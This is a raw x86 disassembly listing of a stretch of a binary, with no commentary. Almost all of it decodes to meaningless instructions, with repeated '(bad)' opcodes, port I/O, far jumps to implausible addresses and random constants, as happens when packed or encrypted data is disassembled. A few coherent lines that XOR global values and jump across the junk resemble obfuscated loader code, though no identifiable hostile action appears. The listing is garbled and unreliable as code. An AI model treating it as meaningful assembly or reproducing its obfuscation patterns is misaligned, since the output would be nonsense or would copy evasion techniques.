  412f21:	loope  0x412f44
  412f23:	mov    ecx,0x41f1971d
  412f28:	stos   DWORD PTR es:[edi],eax
  412f29:	jno    0x412ef5
  412f2b:	and    eax,0xf4ccb7a6
  412f30:	int    0x8c
  412f32:	cs stos BYTE PTR es:[edi],al
  412f34:	and    ebp,DWORD PTR [edx+0x5a7e80fd]
  412f3a:	cmp    ecx,DWORD PTR [ecx+0x76f22505]
  412f40:	ret    0x6bf7
  412f43:	mov    cl,0xc9
  412f45:	iret   
  412f46:	ins    DWORD PTR es:[edi],dx
  412f47:	jecxz  0x412f94
  412f49:	in     al,0xda
  412f4b:	sub    BYTE PTR [edi-0x2c67a665],dh
  412f51:	pop    eax
  412f52:	outs   dx,DWORD PTR ds:[esi]
  412f53:	arpl   WORD PTR [ebx-0x79],sp
  412f56:	push   0x35626993
  412f5b:	pop    ebp
  412f5c:	push   0xe97c8cb6
  412f61:	dec    esp
  412f62:	jle    0x412f79
  412f64:	cmp    eax,0xfb0bde3c
  412f69:	icebp  
  412f6a:	stc    
  412f6b:	test   al,0x3d
  412f6e:	aaa    
  412f6f:	out    dx,eax
  412f70:	inc    edx
  412f71:	mov    ecx,esp
  412f73:	aad    0x6f
  412f75:	aaa    
  412f76:	or     eax,0xbafc7ecb
  412f7b:	nop
  412f7c:	ror    BYTE PTR [ecx+0x67],cl
  412f7f:	jge    0x412f84
  412f81:	in     al,dx
  412f82:	rcl    BYTE PTR [esi-0x4f],1
  412f85:	(bad)  
  412f86:	in     al,0x60
  412f88:	imul   ebx,DWORD PTR [ebp-0x766156a0],0xffffffb4
  412f8f:	enter  0x9667,0x7e
  412f93:	test   DWORD PTR [edi+0x4c],0x2979ae94
  412f9a:	lods   al,BYTE PTR ds:[esi]
  412f9b:	ins    DWORD PTR es:[edi],dx
  412f9c:	pop    esp
  412f9d:	sbb    eax,0x53b0921f
  412fa2:	test   ch,bh
  412fa4:	or     ebx,DWORD PTR [ebx]
  412fa6:	and    BYTE PTR [eax],ah
  412fa8:	inc    ecx
  412fa9:	call   0x5d66:0xe86d73c6
  412fb0:	push   edi
  412fb1:	mov    ah,0xf9
  412fb3:	sbb    DWORD PTR [esi+0x3a],0x5c82e4d9
  412fba:	mov    al,ds:0x982cab79
  412fbf:	inc    eax
  412fc0:	ror    DWORD PTR ds:0x93437c40,1
  412fc6:	push   edx
  412fc7:	push   ecx
  412fc8:	(bad)  
  412fca:	xchg   ebp,eax
  412fcb:	int    0x5c
  412fcd:	div    DWORD PTR [edi]
  412fcf:	sub    al,0x9f
  412fd2:	call   FWORD PTR [edx]
  412fd4:	add    eax,0xdab04eb1
  412fd9:	push   ebx
  412fda:	imul   eax,DWORD PTR [eax],0x272e3ed4
  412fe0:	clc    
  412fe1:	xchg   DWORD PTR [esi+0x6fa7da66],esp
  412fe7:	jbe    0x412fad
  412fe9:	fistp  DWORD PTR [edi+0x781dfe74]
  412fef:	jmp    0x413011
  412ff1:	test   al,0x34
  412ff3:	in     al,0x1a
  412ff5:	and    DWORD PTR [eax],ebp
  412ff7:	arpl   WORD PTR [edi+ebx*2+0x62],si
  412ffb:	into   
  412ffc:	fist   WORD PTR [ebx+0x58]
  412fff:	loop   0x412fa9
  413001:	retf   0x6b35
  413004:	xor    ebp,DWORD PTR [ecx+0x6ed6fc00]
  41300a:	cwde   
  41300b:	inc    edx
  41300c:	push   edx
  41300d:	pop    esp
  41300e:	aas    
  41300f:	call   0x55711275
  413014:	loopne 0x412fab
  413016:	xchg   DWORD PTR [ebx-0x58],edi
  413019:	fdivr  DWORD PTR [ecx+ebp*8]
  41301c:	mov    edx,0x5bee24c9
  413021:	push   ebx
  413022:	mov    ebx,0x1f9bf2ac
  413027:	(bad)  
  413028:	jle    0x413061
  41302a:	cmp    DWORD PTR [ebx+0x27],0x11
  41302e:	mov    bh,0x70
  413030:	es xor eax,0x723e49c9
  413036:	pusha  
  413037:	imul   edx,ecx,0xabb4a940
  41303d:	lods   al,BYTE PTR ds:[esi]
  41303e:	cmp    dl,al
  413040:	int    0x10
  413042:	lods   eax,DWORD PTR ds:[esi]
  413043:	xchg   edi,eax
  413044:	jl     0x413058
  413046:	fistp  WORD PTR [edx-0x3c]
  413049:	inc    esi
  41304a:	fmul   DWORD PTR [esi+0x45]
  41304d:	je     0x412fdc
  41304f:	add    DWORD PTR [ebp-0x7d],esp
  413052:	lock mov bl,BYTE PTR [ebx+0x3f7fd93a]
  413059:	mov    ah,0xba
  41305b:	ss push ss
  41305d:	inc    edx
  41305e:	or     eax,0x5d189bfa
  413063:	test   BYTE PTR [edi],bh
  413065:	test   eax,0x3293cf97
  41306a:	das    
  41306b:	pop    ds
  41306c:	retf   0xe024
  41306f:	(bad)  
  413070:	stos   DWORD PTR es:[edi],eax
  413071:	dec    eax
  413072:	dec    ecx
  413073:	push   0x58c6bb9a
  413078:	sahf   
  413079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41307a:	loop   0x41309a
  41307c:	dec    esi
  41307d:	pop    ss
  41307e:	xlat   BYTE PTR ds:[bx]
  413080:	push   ecx
  413081:	popf   
  413082:	push   ebx
  413083:	mov    esi,0x1c3247f9
  413088:	cs jbe 0x413104
  41308b:	(bad)  
  41308c:	adc    ecx,edi
  41308e:	fidiv  DWORD PTR [ecx+0x3a18b4]
  413094:	xchg   ebx,eax
  413095:	(bad)  
  413096:	fldenv [ebp-0x9464760]
  41309c:	dec    esi
  41309d:	push   ss
  41309e:	arpl   WORD PTR [eax-0x18],si
  4130a1:	mov    ecx,0xdf2f5c51
  4130a6:	or     DWORD PTR [ebx-0x6f],esp
  4130a9:	imul   ebx,DWORD PTR [ebp-0x2ce4c283],0x54
  4130b0:	in     eax,0x3d
  4130b2:	shr    DWORD PTR [edx+0x127819],cl
  4130b8:	out    dx,eax
  4130b9:	dec    ebp
  4130ba:	jnp    0x413109
  4130bc:	inc    esp
  4130bd:	iret   
  4130be:	sub    al,BYTE PTR [edx+0x25]
  4130c1:	xor    eax,0x875ad20f
  4130c6:	out    dx,eax
  4130c7:	call   0x1cc75214
  4130cc:	jns    0x4130bf
  4130ce:	sub    dh,BYTE PTR [ebp-0x2a]
  4130d1:	sub    ebp,DWORD PTR [ebx+0x6e]
  4130d4:	aad    0xd
  4130d6:	iret   
  4130d7:	out    0x2d,eax
  4130d9:	fistp  DWORD PTR [ebp+ebx*4-0x2765c884]
  4130e0:	stos   DWORD PTR es:[edi],eax
  4130e1:	ins    DWORD PTR es:[edi],dx
  4130e2:	pop    es
  4130e3:	sbb    cl,bh
  4130e5:	jno    0x4130a9
  4130e7:	mov    dl,0xe2
  4130e9:	pop    ecx
  4130ea:	pop    ebp
  4130eb:	(bad)  
  4130ec:	das    
  4130ed:	stc    
  4130ee:	dec    eax
  4130ef:	jg     0x4130e2
  4130f1:	inc    ebx
  4130f2:	mov    ecx,0x7611598d
  4130f7:	mov    ds:0xbd44f9f8,al
  4130fc:	addr16 cmc 
  4130fe:	dec    ebp
  4130ff:	popf   
  413100:	test   eax,0xf1a89851
  413105:	les    eax,FWORD PTR [eax-0x2d]
  413108:	loope  0x413100
  41310a:	add    eax,0x34a0c428
  41310f:	jl     0x41313e
  413111:	push   eax
  413112:	add    esp,ecx
  413114:	jp     0x4130cf
  413116:	or     ah,ch
  413118:	dec    eax
  413119:	inc    DWORD PTR [ebx]
  41311b:	or     esi,esp
  41311d:	push   0xb314a240
  413122:	fimul  DWORD PTR [ecx-0x12]
  413125:	xor    al,0x1f
  413127:	hlt    
  413128:	iret   
  413129:	lock dec eax
  41312b:	test   BYTE PTR [ecx+0x77],bh
  41312e:	sar    DWORD PTR [eax-0x1d5db510],0xbe
  413135:	xchg   BYTE PTR [esi-0x1546e947],ah
  41313b:	pop    es
  41313c:	in     eax,0xa9
  41313e:	sub    al,0x8a
  413140:	sub    ebx,DWORD PTR [edi-0x696bba47]
  413146:	push   cs
  413147:	(bad)  [ecx+0x7589d875]
  41314d:	aam    0x89
  41314f:	jne    0x41313d
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	xchg   esi,eax
  41317f:	rol    ebx,cl
  413181:	dec    ebx
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x41317c
  41318b:	daa    
  41318c:	sub    eax,eax
  41318e:	es jne 0x413130
  413191:	push   esp
  413192:	imul   ebx,DWORD PTR [eax+0x7d],0xffffffbd
  413196:	jmp    0xd5e5:0xcb6d6bc6
  41319d:	or     BYTE PTR [ebp+0x7e],ch
  4131a0:	outs   dx,DWORD PTR ds:[esi]
  4131a1:	mov    cl,0x2
  4131a3:	jbe    0x4131b8
  4131a5:	(bad)  
  4131a6:	and    edx,edi
  4131a8:	jbe    0x4131dd
  4131aa:	push   ecx
  4131ab:	mov    WORD PTR [esi-0x1299d5d3],gs
  4131b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131b2:	mov    bl,0x83
  4131b4:	sahf   
  4131b5:	dec    ebx
  4131b6:	hlt    
  4131b7:	and    BYTE PTR [esi-0x47e65e5e],ah
  4131bd:	sub    al,0xd9
  4131bf:	test   DWORD PTR [ebx+0x28e2e2f3],eax
  4131c5:	cld    
  4131c6:	sbb    al,0xdc
  4131c8:	rcr    esi,1
  4131ca:	pop    esp
  4131cb:	xchg   DWORD PTR [esi+0x3e],ebx
  4131ce:	dec    edx
  4131cf:	xchg   ecx,eax
  4131d0:	clc    
  4131d1:	leave  
  4131d2:	mov    BYTE PTR [ecx+0x2f],al
  4131d5:	fnstcw WORD PTR [edx-0x9]
  4131d8:	xchg   ebx,eax
  4131d9:	pop    ebx
  4131da:	xchg   edx,eax
  4131db:	jmp    0x413165
  4131dd:	jmp    0x965bbbd1
  4131e2:	fdiv   DWORD PTR [ebx-0x14]
  4131e5:	cmp    eax,0xaca962c1
  4131ea:	cwde   
  4131eb:	fldenv [esi]
  4131ed:	(bad)  
  4131ee:	jecxz  0x41326d
  4131f0:	mov    edx,0xabaf1d31
  4131f5:	mov    esp,0xd86fe042
  4131fa:	jle    0x41322e
  4131fc:	test   DWORD PTR [eax-0x416f01d],edi
  413202:	cwde   
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	rcr    DWORD PTR [edx-0x42],0x42
  413208:	mov    ebx,0x4ef52f75
  41320d:	in     al,0x18
  41320f:	adc    al,0xd8
  413211:	push   cs
  413212:	clc    
  413213:	xchg   BYTE PTR [edi-0x77],ch
  413216:	call   0xbd122d25
  41321b:	sub    eax,0x61582e59
  413220:	in     al,0x27
  413222:	lods   al,BYTE PTR ds:[esi]
  413223:	stos   BYTE PTR es:[edi],al
  413224:	sub    dl,ah
  413226:	test   al,0xdb
  413228:	mov    ebp,0xff07ae90
  41322d:	jp     0x413256
  41322f:	frstor [edx+0x3f4ade19]
  413235:	cmp    al,0x9d
  413237:	repz retf 0xe5cf
  41323b:	shr    DWORD PTR [esi+ecx*1-0x2a],cl
  41323f:	push   ebp
  413240:	into   
  413241:	mov    ebx,0xee1c2285
  413246:	fbld   TBYTE PTR [esi-0x14]
  413249:	fild   DWORD PTR [ecx]
  41324b:	loopne 0x413228
  41324d:	stos   BYTE PTR es:[edi],al
  41324e:	mov    ds:0x42c2061e,eax
  413253:	scas   al,BYTE PTR es:[edi]
  413254:	adc    eax,0x42043030
  413259:	lea    ecx,[edx-0x5df0d5a4]
  41325f:	lock shl DWORD PTR [ebp-0x11],cl
  413263:	add    DWORD PTR ds:0x96a27a2f,edi
  413269:	adc    BYTE PTR [eax-0xa817c0f],bh
  41326f:	ficomp WORD PTR [ebp+edx*4+0x5d]
  413273:	push   ecx
  413274:	xor    eax,0xe724f830
  413279:	adc    al,0x5
  41327b:	pop    edi
  41327c:	jecxz  0x413201
  41327e:	xor    eax,0x5024c807
  413283:	sbb    edx,DWORD PTR [ecx-0x74]
  413286:	(bad)  
  413287:	fnstenv [ebx]
  413289:	push   esp
  41328a:	popa   
  41328b:	int    0xd3
  41328d:	cmp    bh,BYTE PTR [ebp-0x65]
  413290:	fadd   DWORD PTR [esi+0x63]
  413293:	or     eax,DWORD PTR [edi]
  413295:	jecxz  0x4132db
  413297:	mov    edx,0x83551b7f
  41329c:	and    DWORD PTR [ebx],0xe
  41329f:	push   esi
  4132a0:	or     al,0xb5
  4132a2:	mov    dh,0xe3
  4132a4:	test   DWORD PTR [eax+eiz*8-0x48],ebp
  4132a8:	jl     0x41325f
  4132aa:	pop    ecx
  4132ab:	hlt    
  4132ac:	int3   
  4132ad:	sub    eax,0xe6bf68f5
  4132b2:	add    BYTE PTR [ebx-0x64],cl
  4132b5:	pop    eax
  4132b6:	cmp    BYTE PTR [edi-0x1d10ecf7],cl
  4132bc:	clc    
  4132bd:	inc    edx
  4132be:	pop    esi
  4132bf:	mov    al,0x4
  4132c1:	loope  0x413284
  4132c3:	mov    BYTE PTR [edx-0x12c70928],ah
  4132c9:	push   esp
  4132ca:	ret    
  4132cb:	xor    BYTE PTR [ebp+0x7b],bl
  4132ce:	sbb    bh,BYTE PTR ds:0xac695dfb
  4132d4:	dec    edx
  4132d5:	jne    0x41333d
  4132d7:	push   edx
  4132d8:	loop   0x4132ad
  4132da:	push   ds
  4132db:	aam    0xe
  4132dd:	mov    esp,0x589da0e2
  4132e2:	(bad)  
  4132e3:	jle    0x41335a
  4132e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132e6:	xchg   BYTE PTR [edi+ebp*1-0x7a349c75],ch
  4132ed:	(bad)  
  4132ee:	mov    dh,0x94
  4132f0:	fwait
  4132f1:	pushf  
  4132f2:	mov    eax,ds:0x1fc98d65
  4132f7:	xchg   ecx,eax
  4132f8:	mov    ah,0x45
  4132fa:	out    0x35,al
  4132fc:	in     al,0x61
  4132fe:	push   eax
  4132ff:	push   ecx
  413300:	xor    DWORD PTR [edi+eiz*4],ebx
  413303:	arpl   di,di
  413305:	fisubr DWORD PTR [esi-0x77]
  413308:	inc    esi
  413309:	or     bh,BYTE PTR [edi-0x53dfa889]
  41330f:	dec    edi
  413310:	pop    ds
  413311:	jnp    0x413349
  413313:	ss ffree st(7)
  413316:	es dec ebp
  413318:	call   0xcb7f:0xe4ee0cec
  41331f:	xlat   BYTE PTR ds:[ebx]
  413320:	and    BYTE PTR [esi-0x74510e91],bl
  413326:	pop    ebx
  413327:	cli    
  413328:	imul   BYTE PTR [ebx]
  41332a:	xor    edi,DWORD PTR [eax-0x25]
  41332d:	pop    ebp
  41332e:	jae    0x4132da
  413330:	(bad)  
  413331:	or     bl,ah
  413333:	gs cli 
  413335:	jl     0x41336d
  413337:	or     BYTE PTR [edi],0x62
  41333a:	pop    esi
  41333b:	iret   
  41333c:	test   DWORD PTR [edx-0x7487653],edx
  413342:	jmp    0x956ef698
  413347:	ror    BYTE PTR [edx],0x1e
  41334a:	lock test eax,0x1e483756
  413350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413351:	sti    
  413352:	and    DWORD PTR ds:0xb1f2c441,esi
  413358:	lods   al,BYTE PTR ds:[esi]
  413359:	icebp  
  41335a:	test   al,0x66
  41335c:	cmc    
  41335d:	dec    ecx
  41335e:	sbb    dl,al
  413360:	push   ebp
  413361:	fsubp  st(2),st
  413363:	(bad)  
  413364:	sbb    al,0x7c
  413366:	inc    ebx
  413367:	fadd   QWORD PTR [ecx+0x28]
  41336a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41336b:	xor    eax,0x103aa337
  413370:	loopne 0x4133c1
  413372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413373:	(bad)  
  413374:	leave  
  413375:	inc    esi
  413376:	test   DWORD PTR [eax-0xa3f6c19],esi
  41337c:	(bad)  
  41337d:	mov    ebp,0x58ccca07
  413382:	adc    DWORD PTR [esi+0x43],esp
  413385:	or     ah,BYTE PTR [edi-0x4e135bf7]
  41338b:	xchg   ecx,eax
  41338c:	mov    ds:0xe2be8b15,eax
  413391:	push   esp
  413392:	mov    ecx,0xeacd435
  413397:	mov    cl,0xdd
  413399:	inc    ecx
  41339a:	push   0xcc1716a8
  41339f:	mov    bl,0xbb
  4133a2:	sub    cl,dh
  4133a4:	in     al,0xa1
  4133a6:	cmp    esp,DWORD PTR [ecx+0x15]
  4133a9:	push   esp
  4133aa:	loopne 0x41340f
  4133ac:	dec    ebp
  4133ad:	and    esp,DWORD PTR [ebx-0x40]
  4133b0:	mov    ?,WORD PTR [eax]
  4133b2:	imul   ecx,DWORD PTR [eax],0x9
  4133b5:	mov    DWORD PTR ds:0xad2859c9,eax
  4133bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133bc:	xor    dl,BYTE PTR ds:0xde56e183
  4133c2:	cwde   
  4133c3:	scas   eax,DWORD PTR es:[edi]
  4133c4:	mov    dl,0x8b
  4133c6:	das    
  4133c7:	xor    edi,DWORD PTR [esi]
  4133c9:	mov    esi,?
  4133cb:	loop   0x4133e0
  4133cd:	fisttp QWORD PTR [eax-0x54b4bc81]
  4133d3:	mov    dl,0x21
  4133d5:	aaa    
  4133d6:	ret    0xa17c
  4133d9:	mov    ds:0xbe6972d8,eax
  4133de:	and    BYTE PTR [ecx+0x32],0x93
  4133e2:	dec    ebp
  4133e3:	pop    ebx
  4133e4:	outs   dx,BYTE PTR ds:[esi]
  4133e5:	aad    0x1f
  4133e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133e8:	loop   0x4133a0
  4133ea:	and    DWORD PTR [edx+ecx*1+0x677b4043],esp
  4133f1:	inc    ebp
  4133f2:	addr16 xchg edx,eax
  4133f4:	sbb    BYTE PTR [edi+0x24de304c],0xb9
  4133fb:	adc    ch,al
  4133fd:	jb     0x41341b
  4133ff:	or     BYTE PTR [ebx-0x38],0x8b
  413403:	das    
  413404:	or     al,0xb4
  413406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413407:	pusha  
  413408:	jge    0x413412
  41340a:	popa   
  41340b:	sbb    ah,BYTE PTR [eax-0xd1251f0]
  413411:	pop    ds
  413412:	push   ecx
  413413:	outs   dx,DWORD PTR ds:[esi]
  413414:	or     eax,0xadfe18d9
  413419:	sti    
  41341a:	les    ecx,FWORD PTR [esi+0x61]
  41341d:	ds (bad) 
  41341f:	rcr    DWORD PTR [edx],1
  413421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413422:	cs cdq 
  413424:	aad    0x18
  413426:	mov    edi,0xd98d5f41
  41342b:	cwde   
  41342c:	sub    BYTE PTR [esp+edi*1+0x3fa2e068],dh
  413433:	jno    0x41342f
  413435:	add    DWORD PTR [ecx+0x477075b4],ebp
  41343b:	gs addr16 add eax,0x9f71ac3b
  413442:	jno    0x41341e
  413444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413445:	lods   al,BYTE PTR ds:[esi]
  413446:	je     0x413463
  413448:	inc    esp
  413449:	(bad)  
  41344a:	sti    
  41344b:	mov    ds:0xe8251a6a,eax
  413450:	scas   eax,DWORD PTR es:[edi]
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x27b3ec0f,al
  413492:	cli    
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xbd70707e
  41349c:	mov    eax,0x9852d10f
  4134a1:	jmp    0x4134f1
  4134a3:	xchg   ebx,ecx
  4134a5:	ss aas 
  4134a7:	cmp    eax,0xdd901539
  4134ac:	mov    dh,0x0
  4134ae:	je     0x413479
  4134b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134b1:	sbb    esi,0xc26f03d5
  4134b7:	fist   DWORD PTR [ebx-0x61]
  4134ba:	(bad)  
  4134bb:	jnp    0x4134dc
  4134bd:	mov    bl,0x73
  4134bf:	and    edx,DWORD PTR [eax]
  4134c1:	jle    0x41348b
  4134c3:	gs (bad) 
  4134c5:	in     al,dx
  4134c6:	sar    DWORD PTR [ebx-0x3597462e],0xf0
  4134cd:	pop    DWORD PTR [edi-0x79]
  4134d0:	pop    eax
  4134d1:	pop    ds
  4134d2:	scas   al,BYTE PTR es:[edi]
  4134d3:	push   0x2839d649
  4134d8:	jmp    0x9acc:0x44488436
  4134df:	jns    0x4134ca
  4134e1:	gs es jb 0x4134d1
  4134e5:	loopne 0x4134ce
  4134e7:	adc    BYTE PTR [edx+0x95029c1],dh
  4134ed:	push   esi
  4134ee:	or     dl,BYTE PTR [eax]
  4134f0:	xor    bl,BYTE PTR [eax-0x274cb3ce]
  4134f6:	jmp    0x3d48f5f9
  4134fb:	sbb    al,0x69
  4134fd:	xchg   esp,eax
  4134fe:	dec    edx
  4134ff:	sub    al,BYTE PTR [esp+edi*2]
  413502:	sub    DWORD PTR [edx-0x59],0xffffff86
  413506:	mov    edx,fs
  413508:	sbb    al,0xec
  41350a:	jno    0x413539
  41350c:	mov    DWORD PTR [esi],esp
  41350e:	pop    esi
  41350f:	retf   0x4109
  413512:	lods   eax,DWORD PTR ds:[esi]
  413513:	and    ah,BYTE PTR [esi-0x423fe80d]
  413519:	rol    BYTE PTR [eax-0x2f],1
  41351c:	fmul   DWORD PTR [esi]
  41351e:	mov    bh,0x61
  413520:	pop    ebp
  413521:	cmp    edi,DWORD PTR [ebp+0x5e]
  413524:	dec    esi
  413525:	sar    BYTE PTR [ebx-0x26],cl
  413528:	(bad)  
  413529:	adc    al,BYTE PTR fs:[eax+0x4e]
  41352d:	(bad)  
  41352e:	xchg   esp,eax
  41352f:	dec    ebx
  413530:	xchg   ebp,eax
  413531:	lds    edi,FWORD PTR [eax+eax*2-0x6ea2f878]
  413538:	pop    eax
  413539:	inc    ebx
  41353a:	inc    edx
  41353b:	xor    DWORD PTR ds:0x603cb452,0xa6d65841
  413545:	xlat   BYTE PTR ds:[ebx]
  413546:	xchg   edx,eax
  413547:	xchg   edx,eax
  413548:	ret    0x36c4
  41354b:	mov    eax,ds:0xe517a04a
  413550:	int    0x8d
  413552:	(bad)  
  413553:	pop    eax
  413554:	mov    eax,0xf09b8e27
  413559:	mov    ds:0xd2506257,al
  41355e:	cmp    ch,bh
  413560:	out    dx,al
  413561:	enter  0x64e6,0x3
  413565:	inc    eax
  413566:	inc    ebx
  413567:	into   
  413568:	xor    eax,DWORD PTR [ebx+0x3c6743ed]
  41356e:	xchg   ebp,eax
  41356f:	enter  0x1442,0xf4
  413573:	cmc    
  413574:	sbb    ebp,DWORD PTR [edi+ebp*4]
  413577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413579:	mov    ebx,0x8d472352
  41357e:	aad    0xfb
  413580:	xchg   BYTE PTR [eax-0x64],dl
  413583:	cmp    al,0xb4
  413585:	test   BYTE PTR [ebx-0x300e39de],bh
  41358b:	mov    esi,0xcac77ce8
  413590:	cmp    BYTE PTR [ebp+edi*2-0x6d],al
  413594:	or     al,0x73
  413596:	test   DWORD PTR [esi],esi
  413598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413599:	enter  0x82f0,0xda
  41359d:	mov    edx,0x1cf193ff
  4135a2:	cmp    al,0x4f
  4135a4:	mov    ebp,0x462b5a1e
  4135a9:	adc    ecx,DWORD PTR [ebx+0x46]
  4135ac:	inc    ecx
  4135ad:	dec    edi
  4135ae:	lock add edx,0x200406a2
  4135b5:	sub    ch,BYTE PTR [edi-0x5b]
  4135b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135b9:	sub    BYTE PTR [edx-0x30],al
  4135bc:	div    DWORD PTR [esi+0x44defe75]
  4135c2:	lods   al,BYTE PTR ds:[esi]
  4135c3:	scas   al,BYTE PTR es:[edi]
  4135c4:	inc    esp
  4135c5:	call   0xf75b:0x510cf73b
  4135cc:	push   ss
  4135cd:	xor    al,0x2
  4135cf:	jae    0x4135f9
  4135d1:	hlt    
  4135d2:	xor    edx,eax
  4135d4:	fidiv  DWORD PTR [ebp+0x77]
  4135d7:	outs   dx,DWORD PTR ds:[esi]
  4135d8:	inc    esi
  4135d9:	adc    DWORD PTR [ecx+0x6b],0x71e0ada6
  4135e0:	sub    DWORD PTR [ecx+0x3a],ebp
  4135e3:	outs   dx,BYTE PTR ds:[esi]
  4135e4:	dec    esp
  4135e5:	iret   
  4135e6:	and    al,0x83
  4135e8:	adc    esi,DWORD PTR [eax-0x8]
  4135eb:	or     eax,0xe05ae7e5
  4135f0:	mov    bl,0x80
  4135f2:	lods   eax,DWORD PTR ds:[esi]
  4135f3:	sbb    al,0xd6
  4135f5:	sbb    eax,0xc3d7fc1b
  4135fa:	mov    al,ds:0x293d04bc
  4135ff:	mov    esi,0xf6c50654
  413604:	xchg   ebp,eax
  413605:	fwait
  413606:	mov    WORD PTR ds:0x3f19b023,gs
  41360c:	sbb    al,0xed
  41360e:	lds    esp,FWORD PTR [ebx+0x6d]
  413611:	adc    al,0x48
  413613:	pushf  
  413614:	jnp    0x41368e
  413616:	nop
  413617:	cmp    ch,BYTE PTR [eax+0x447d91ec]
  41361d:	leave  
  41361e:	xchg   edi,eax
  41361f:	retf   
  413620:	out    dx,eax
  413621:	dec    eax
  413622:	jnp    0x4136a1
  413624:	pop    edx
  413625:	push   esi
  413626:	jae    0x4135f3
  413628:	shr    edi,0x2b
  41362b:	add    al,0xa
  41362d:	xchg   edx,eax
  41362e:	imul   esi,edx,0xd4f9de6d
  413634:	hlt    
  413635:	dec    edx
  413636:	push   ss
  413637:	stc    
  413638:	push   ds
  413639:	inc    ebx
  41363a:	mov    eax,ds:0x513b17dd
  41363f:	sub    esi,ecx
  413641:	rcl    DWORD PTR [edx+0x3a],0xad
  413645:	and    eax,0x65cb1f02
  41364a:	imul   ebp,DWORD PTR [esi+0x3],0x4933f91d
  413651:	mov    BYTE PTR [edx+0x18],dl
  413654:	xor    eax,0x5e95775e
  413659:	out    0x36,al
  41365b:	ins    BYTE PTR es:[edi],dx
  41365c:	pop    ebx
  41365d:	(bad)  
  41365f:	inc    esp
  413660:	push   es
  413661:	mov    ah,BYTE PTR [ecx-0x5a88c69d]
  413667:	les    ebx,FWORD PTR [ecx+0x53]
  41366a:	pop    ebp
  41366b:	pop    edx
  41366c:	add    al,0x75
  41366e:	aam    0x47
  413670:	pop    esp
  413671:	pop    ecx
  413672:	lds    ecx,FWORD PTR [esi+ebp*8+0x74]
  413676:	(bad)  
  413677:	fs nop
  413679:	and    DWORD PTR [ecx],ecx
  41367b:	ss loop 0x4136a6
  41367e:	xchg   esp,eax
  41367f:	mov    esp,0xb0116052
  413684:	clc    
  413685:	xchg   edx,eax
  413686:	and    BYTE PTR [eax-0x1850fae9],dl
  41368c:	or     DWORD PTR [eax+eax*8],ecx
  41368f:	add    DWORD PTR [edx],ebp
  413691:	dec    ebx
  413692:	push   cs
  413693:	cmp    BYTE PTR [edi+0x4a],ah
  413696:	aad    0x7
  413698:	add    eax,0xee6fd125
  41369d:	cli    
  41369e:	(bad)  
  41369f:	mov    edi,0x525e6018
  4136a4:	jmp    0xf442:0x3590c6af
  4136ab:	sbb    BYTE PTR [esi-0x3d88a299],ah
  4136b1:	loopne 0x4136bf
  4136b3:	sbb    BYTE PTR [ecx],cl
  4136b5:	adc    esi,DWORD PTR [edi]
  4136b7:	and    DWORD PTR [edx+0x569481d8],0x284f94df
  4136c1:	icebp  
  4136c2:	out    dx,eax
  4136c3:	dec    edx
  4136c4:	xchg   ebp,eax
  4136c5:	or     DWORD PTR [edx-0x60e4c8e5],ebx
  4136cb:	jmp    0x8977:0xc39050e
  4136d2:	aam    0xc3
  4136d4:	jle    0x4136e3
  4136d6:	pop    esp
  4136d7:	mov    DWORD PTR [edx-0x71879029],edi
  4136dd:	enter  0xb244,0xbd
  4136e1:	xchg   edx,eax
  4136e2:	or     edi,DWORD PTR [ecx+0xabef8d8]
  4136e8:	and    esi,DWORD PTR ds:0xdaf5781c
  4136ee:	jae    0x413681
  4136f0:	mov    al,ds:0x1300f1d
  4136f5:	jo     0x4136a3
  4136f7:	jl     0x4136bf
  4136f9:	adc    edx,DWORD PTR [ebp-0x19]
  4136fc:	add    BYTE PTR [edi+0xdb23c1],0xb9
  413703:	mov    bh,0x6c
  413705:	test   ecx,0xec86bc2c
  41370b:	or     DWORD PTR [ecx+0x70ba6c0f],ebx
  413711:	and    eax,0x1917f857
  413716:	(bad)  
  413717:	aas    
  413718:	jne    0x413735
  41371a:	dec    edx
  41371b:	mov    edx,0xac2af1d7
  413720:	scas   al,BYTE PTR es:[edi]
  413721:	xchg   edi,eax
  413722:	jb     0x41371b
  413724:	retf   0x529
  413727:	loope  0x4136e6
  413729:	push   ds
  41372a:	dec    dl
